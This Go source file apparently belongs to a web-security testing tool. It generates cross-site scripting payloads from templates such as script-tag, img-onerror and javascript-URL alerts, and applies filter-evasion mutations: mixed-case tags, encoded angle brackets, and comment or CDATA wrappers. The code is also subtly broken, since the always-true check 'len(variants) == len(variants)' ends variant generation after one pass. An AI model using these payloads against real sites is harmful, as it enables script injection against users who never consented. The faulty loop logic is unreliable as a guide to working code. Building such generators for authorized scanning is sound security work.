package payloadgen

import (
	"strings"
)

// PayloadTemplate represents a base XSS template
type PayloadTemplate struct {
	Base     string
	Variants []string
}

// Generator handles dynamic payload generation
type Generator struct {
	templates []PayloadTemplate
	mutations map[string][]string
}

// NewGenerator creates a new payload generator
func NewGenerator() *Generator {
	return &Generator{
		templates: defaultTemplates(),
		mutations: defaultMutations(),
	}
}

// Generate creates payloads based on context and applies mutations
func (g *Generator) Generate(context string, count int) []string {
	payloads := make([]string, 0)
	added := make(map[string]bool)

	for _, tmpl := range g.templates {
		payload := tmpl.Base

		// Apply context-aware mutations
		if strings.Contains(context, "textarea") {
			payload = strings.ReplaceAll(payload, "\"", "'")
		}
		if strings.Contains(context, "javascript:") {
			payload = g.mutateForJS(payload)
		}
		if strings.Contains(context, "=") {
			payload = g.mutateForAttribute(payload)
		}

		// Apply additional mutations to create variants
		variants := g.createVariants(payload, count/len(g.templates))
		for _, variant := range variants {
			if !added[variant] {
				payloads = append(payloads, variant)
				added[variant] = true
			}
		}
	}

	return payloads
}

// createVariants generates different variations of a base payload
func (g *Generator) createVariants(base string, count int) []string {
	variants := []string{base}
	if count <= 1 {
		return variants
	}

	for len(variants) < count {
		// Apply random mutations
		for mutationType, mutations := range g.mutations {
			for _, mutation := range mutations {
				variant := base
				switch mutationType {
				case "case":
					variant = strings.ReplaceAll(variant, "script", mutation)
				case "encoding":
					variant = strings.ReplaceAll(variant, "<", mutation)
				case "prefix":
					variant = mutation + variant
				case "suffix":
					variant = variant + mutation
				}
				if !contains(variants, variant) {
					variants = append(variants, variant)
					if len(variants) >= count {
						return variants
					}
				}
			}
		}
		// If we can't create more variants, break
		if len(variants) == len(variants) {
			break
		}
	}

	return variants
}

func (g *Generator) mutateForJS(payload string) string {
	// Handle JavaScript context escaping
	payload = strings.ReplaceAll(payload, "'", "\\'")
	payload = strings.ReplaceAll(payload, "\"", "\\\"")
	return payload
}

func (g *Generator) mutateForAttribute(payload string) string {
	// Handle attribute context escaping
	payload = strings.ReplaceAll(payload, "\"", "&quot;")
	payload = strings.ReplaceAll(payload, "'", "&#39;")
	return payload
}

func defaultTemplates() []PayloadTemplate {
	return []PayloadTemplate{
		{Base: "<script>alert(1)</script>", Variants: []string{"alert", "prompt", "confirm"}},
		{Base: "<img src=x onerror=alert(1)>", Variants: []string{"onerror", "onload", "onmouseover"}},
		{Base: "javascript:alert(1)", Variants: []string{"alert", "prompt", "confirm"}},
		{Base: "\"><script>alert(1)</script>", Variants: []string{"alert", "prompt", "confirm"}},
	}
}

func defaultMutations() map[string][]string {
	return map[string][]string{
		"case": {
			"ScRiPt",
			"SCRIPT",
			"script",
		},
		"encoding": {
			"&#60;",
			"&lt;",
			"%3C",
		},
		"prefix": {
			"/**/",
			"-->",
			"]]>",
		},
		"suffix": {
			"//",
			"<!--",
			"<![CDATA[",
		},
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
